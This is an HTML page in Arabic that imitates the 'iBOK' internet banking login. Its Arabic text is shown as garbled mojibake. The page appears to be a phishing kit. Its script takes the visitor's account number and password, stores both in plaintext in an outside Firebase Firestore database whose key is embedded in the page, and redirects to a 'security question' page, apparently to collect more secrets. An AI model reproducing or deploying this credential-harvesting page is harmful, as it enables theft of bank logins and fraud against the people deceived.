<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
ย <meta charset="UTF-8">
ย <meta name="viewport" content="width=device-width, initial-scale=1.0">
ย <title>ุชุณุฌูู ุงูุฏุฎูู - iBOK</title>
ย <link rel="stylesheet" href="styles.css">
ย ย <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>

<header class="app-header">
ย <div class="header-main">
ย ย <div class="logo-container">
ย ย ย <span class="logo-text-i">i</span><span class="logo-text-bok">BOK</span>
ย ย </div>
ย ย <div class="service-info">
ย ย ย <div class="arabic-title">ุงูุฎุฏูุงุช ุงููุตุฑููุฉ ุนุจุฑ ุงูุฅูุชุฑูุช</div>
ย ย ย <div class="english-title">Internet Banking Services</div>
ย ย </div>
ย </div>
ย <div class="welcome-bar">
ย ย ูุฑุญุจุงู ุจูู ูู ุฎุฏูุฉ **iBOK** ุงููุตุฑููุฉ ุนุจุฑ ุงูุฅูุชุฑูุช
ย </div>
</header>
<div class="container">
ย <main class="main-content">
ย ย <div class="login-card">
ย ย ย <h1 class="card-title">ุชุณุฌูู ุงูุฏุฎูู</h1>
ย ย ย <div class="card-subtitle">ุงูุฑุฌุงุก ุฅุฏุฎุงู ุงูุจูุงูุงุช</div>

ย ย ย <form id="loginForm">
ย ย ย ย <div class="form-group">
ย ย ย ย ย ย ย ย ย ย <label for="userID" class="sr-only">ุฑูู ุงูุญุณุงุจ:</label>
ย ย ย ย ย <input type="text" id="userID" placeholder="ุฃุฏุฎู ุฑูู ุงูุญุณุงุจ ุงููููู ูู 7 ุฃุฑูุงู" maxlength="7" required class="app-input">
ย ย ย ย </div>

ย ย ย ย <div class="form-group password-group">
ย ย ย ย ย <label for="password" class="sr-only">ูููุฉ ุงููุฑูุฑ:</label>
ย ย ย ย ย ย ย ย ย ย <input type="password" id="password" placeholder="ุฃุฏุฎู ูููุฉ ุงููุฑูุฑ" required class="app-input">
ย ย ย ย ย <span class="password-toggle">๐๏ธ</span> ย ย ย ย </div>

ย ย ย ย <a href="#" class="forgot-password-link">ูุณูุช ูููุฉ ุงููุฑูุฑุ</a>

ย ย ย ย <button type="submit" class="btn-login app-btn">ุชุณุฌูู ุงูุฏุฎูู</button>
ย ย ย </form>
ย ย </div>
ย </main>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";

// ุฅุนุฏุงุฏุงุช Firebase
const firebaseConfig = {
ย apiKey: "AIzaSyB8EntKIzd3OfSTqhghCLm68iVwt5WaIRU",
ย authDomain: "project-id-77eb2.firebaseapp.com",
ย projectId: "project-id-77eb2",
ย storageBucket: "project-id-77eb2.appspot.com",
ย messagingSenderId: "1061898051036",
ย appId: "1:1061898051036:web:0eda29a129b8fce871c319"
};
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const form = document.getElementById('loginForm');
form.addEventListener('submit', async e => {
ย e.preventDefault();
ย const userID = document.getElementById('userID').value.trim();
ย const password = document.getElementById('password').value.trim();

ย if (!userID || !password) {
ย ย alert('ุงูุฑุฌุงุก ุฅุฏุฎุงู ุฑูู ุงูุญุณุงุจ ููููุฉ ุงููุฑูุฑ');
ย ย return;
ย }

ย try {
ย ย // ุญูุธ ุฑูู ุงูุญุณุงุจ ููููุฉ ุงููุฑูุฑ ูู Firestore
ย ย await setDoc(doc(db, "users", userID), {
ย ย ย userID,
ย ย ย password
ย ย }, { merge: true }); // merge ุญุชู ูุง ูุญุฐู ุจูุงูุงุช ุฃุฎุฑู

ย ย // ุญูุธ userID ูุญูููุง ููุตูุญุงุช ุงูุชุงููุฉ
ย ย localStorage.setItem('userID', userID);

ย ย // ุงูุงูุชูุงู ูุตูุญุฉ ุณุคุงู ุงูุฃูุงู
ย ย window.location.href = "security-question.html";
ย } catch(err) {
ย ย console.error(err);
ย ย alert("ุญุฏุซ ุฎุทุฃ ุฃุซูุงุก ุงูุญูุธุ ุญุงูู ูุฑุฉ ุฃุฎุฑู.");
ย }
});
</script>
</body>
</html>